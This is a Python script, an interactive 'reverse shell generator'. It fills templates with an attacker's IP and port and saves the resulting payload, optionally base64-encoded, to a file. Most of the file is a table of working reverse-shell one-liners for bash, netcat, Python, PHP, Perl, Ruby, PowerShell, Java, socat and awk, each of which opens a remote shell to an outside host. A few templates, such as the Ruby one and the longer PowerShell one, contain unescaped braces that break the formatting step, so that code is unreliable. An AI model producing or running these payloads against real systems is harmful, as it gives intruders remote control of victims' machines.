import sys
import base64

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

SHELLS = {
    "bash": {
        "simple": 'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "udp": 'bash -u >& /dev/udp/{ip}/{port} 0>&1',
        "exec": 'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'
    },
    "netcat": {
        "classic": 'nc {ip} {port} -e /bin/sh',
        "openbsd": 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {ip} {port} > /tmp/f',
        "ncat": 'ncat --udp {ip} {port} -e /bin/bash'
    },
    "python": {
        "basic": 'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
        "python3": 'python3 -c \'import socket,subprocess,os; s=socket.socket(); s.connect(("{ip}",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])\''
    },
    "php": {
        "fsockopen": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "shell_exec": 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "system": 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/sh -i <&3 >&3 2>&3");\''
    },
    "perl": {
        "simple": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''
    },
    "ruby": {
        "basic": 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
    },
    "powershell": {
        "basic": 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}',
        "short": 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"'
    },
    "java": {
        "socket": 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"].toArray());p.waitFor();'
    },
    "socat": {
        "basic": 'socat TCP:{ip}:{port} EXEC:/bin/sh',
        "tty": 'socat TCP:{ip}:{port} EXEC:"/bin/sh",pty,stderr,setsid,sigint,sane'
    },
    "awk": {
        "simple": 'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(1) {{do{{ printf "> " |& s; s |& getline c; if (c) {{ while ((c |& getline) > 0) print $0 |& s; close(c) }} }} while(c != "exit") close(s)}}}}\' /dev/null'
    }
}

def prompt_choice(title, choices):
    print(f"\n{title}")
    for idx, key in enumerate(choices):
        print(f"{idx + 1}. {key}")
    try:
        index = int(input("➤ Select an option: ")) - 1
        return list(choices.keys())[index]
    except (IndexError, ValueError):
        print(bcolors.FAIL + "❌ Invalid choice." + bcolors.ENDC)
        sys.exit(1)

def main():
    print(bcolors.BOLD + "💀 Revers3r — Interactive Reverse Shell Generator 💀" + bcolors.ENDC)

    lang = prompt_choice("Select a language:", SHELLS)
    variants = SHELLS[lang]

    if len(variants) > 1:
        variant = prompt_choice(f"Select a variant for {lang}:", variants)
    else:
        variant = next(iter(variants))

    ip = input("Enter your IP address (LHOST): ").strip()
    port = input("Enter your port (LPORT): ").strip()
    encode_b64 = input("Encode the payload in base64? (y/N): ").strip().lower() == 'y'
    file_name = input("Enter output file name (without extension): ").strip()
    file_path = f"{file_name}.txt"

    try:
        raw_payload = SHELLS[lang][variant].format(ip=ip, port=port)
        payload = base64.b64encode(raw_payload.encode()).decode() if encode_b64 else raw_payload

        with open(file_path, 'w') as f:
            f.write(payload)

        print("\n✅ Payload generated and saved to:", file_path)

    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
